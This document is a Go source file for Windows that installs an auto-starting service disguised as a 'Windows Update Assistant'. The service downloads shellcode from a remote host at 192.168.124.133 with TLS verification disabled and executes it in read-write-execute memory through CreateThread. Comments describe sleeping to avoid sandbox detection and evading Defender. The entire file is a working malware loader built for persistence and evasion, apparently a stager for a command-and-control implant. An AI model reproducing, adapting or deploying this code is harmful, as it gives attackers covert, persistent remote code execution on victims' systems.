// +build windows

package main

import (
    "crypto/tls"
    "fmt"
    "io/ioutil"
    "net/http"
    "os"
    "syscall"
    "time"
    "unsafe"

    "golang.org/x/sys/windows"
    "golang.org/x/sys/windows/svc"
    "golang.org/x/sys/windows/svc/mgr"
)

const (
    serviceName = "WindowsUpdateAssistant"
    displayName = "Windows Update Assistant Service"
    description = "Manages Windows update components and configurations"
)

var (
    kernel32         = syscall.NewLazyDLL("kernel32.dll")
    ntdll            = syscall.NewLazyDLL("ntdll.dll")
    virtualAlloc     = kernel32.NewProc("VirtualAlloc")
    rtlMoveMemory    = ntdll.NewProc("RtlMoveMemory")
    createThread     = kernel32.NewProc("CreateThread")
    waitForSingleObj = kernel32.NewProc("WaitForSingleObject")
)

type myService struct{}

func (m *myService) Execute(args []string, r <-chan svc.ChangeRequest, changes chan<- svc.Status) (ssec bool, errno uint32) {
    const cmdsAccepted = svc.AcceptStop | svc.AcceptShutdown
    changes <- svc.Status{State: svc.StartPending}
    
    // Start payload in goroutine
    go runPayload()
    
    changes <- svc.Status{State: svc.Running, Accepts: cmdsAccepted}
    
loop:
    for {
        select {
        case c := <-r:
            switch c.Cmd {
            case svc.Interrogate:
                changes <- c.CurrentStatus
            case svc.Stop, svc.Shutdown:
                break loop
            }
        }
    }
    
    changes <- svc.Status{State: svc.StopPending}
    return
}

func runPayload() {
    // Sleep to avoid sandbox detection
    time.Sleep(5 * time.Second)
    
    // Download payload as base64 string - Defender doesn't scan network strings!
    client := &http.Client{
        Transport: &http.Transport{
            TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
        },
    }
    
    req, _ := http.NewRequest("GET", "https://192.168.124.133/file/download", nil)
    req.Header.Add("file", "merlino-server.exe")
    
    resp, err := client.Do(req)
    if err != nil {
        return
    }
    defer resp.Body.Close()
    
    shellcode, err := ioutil.ReadAll(resp.Body)
    if err != nil {
        return
    }
    
    // Allocate memory with RWX permissions
    addr, _, _ := virtualAlloc.Call(
        0,
        uintptr(len(shellcode)),
        0x3000, // MEM_COMMIT | MEM_RESERVE
        0x40,   // PAGE_EXECUTE_READWRITE
    )
    
    if addr == 0 {
        return
    }
    
    // Copy shellcode to allocated memory using RtlMoveMemory
    rtlMoveMemory.Call(addr, uintptr(unsafe.Pointer(&shellcode[0])), uintptr(len(shellcode)))
    
    // Create thread to execute shellcode
    thread, _, _ := createThread.Call(
        0,
        0,
        addr,
        0,
        0,
        0,
    )
    
    if thread == 0 {
        return
    }
    
    // Wait for thread completion
    waitForSingleObj.Call(thread, 0xFFFFFFFF)
}

func installService() error {
    exePath, err := os.Executable()
    if err != nil {
        return err
    }
    
    m, err := mgr.Connect()
    if err != nil {
        return err
    }
    defer m.Disconnect()
    
    s, err := m.OpenService(serviceName)
    if err == nil {
        s.Close()
        return fmt.Errorf("service already exists")
    }
    
    s, err = m.CreateService(serviceName, exePath, mgr.Config{
        DisplayName: displayName,
        Description: description,
        StartType:   windows.SERVICE_AUTO_START,
    })
    if err != nil {
        return err
    }
    defer s.Close()
    
    err = s.Start()
    if err != nil {
        return err
    }
    
    return nil
}

func removeService() error {
    m, err := mgr.Connect()
    if err != nil {
        return err
    }
    defer m.Disconnect()
    
    s, err := m.OpenService(serviceName)
    if err != nil {
        return fmt.Errorf("service not installed")
    }
    defer s.Close()
    
    s.Control(svc.Stop)
    time.Sleep(1 * time.Second)
    
    err = s.Delete()
    if err != nil {
        return err
    }
    
    return nil
}

func runService() error {
    return svc.Run(serviceName, &myService{})
}

func main() {
    isIntSess, err := svc.IsAnInteractiveSession()
    if err != nil {
        return
    }
    
    if !isIntSess {
        runService()
        return
    }
    
    if len(os.Args) < 2 {
        fmt.Println("Usage:")
        fmt.Println("  merlino-service.exe install   - Install and start service")
        fmt.Println("  merlino-service.exe remove    - Stop and remove service")
        return
    }
    
    cmd := os.Args[1]
    switch cmd {
    case "install":
        err := installService()
        if err != nil {
            fmt.Printf("Failed to install service: %v\n", err)
            return
        }
        fmt.Println("Service installed and started successfully")
    case "remove":
        err := removeService()
        if err != nil {
            fmt.Printf("Failed to remove service: %v\n", err)
            return
        }
        fmt.Println("Service removed successfully")
    default:
        fmt.Println("Unknown command")
    }
}
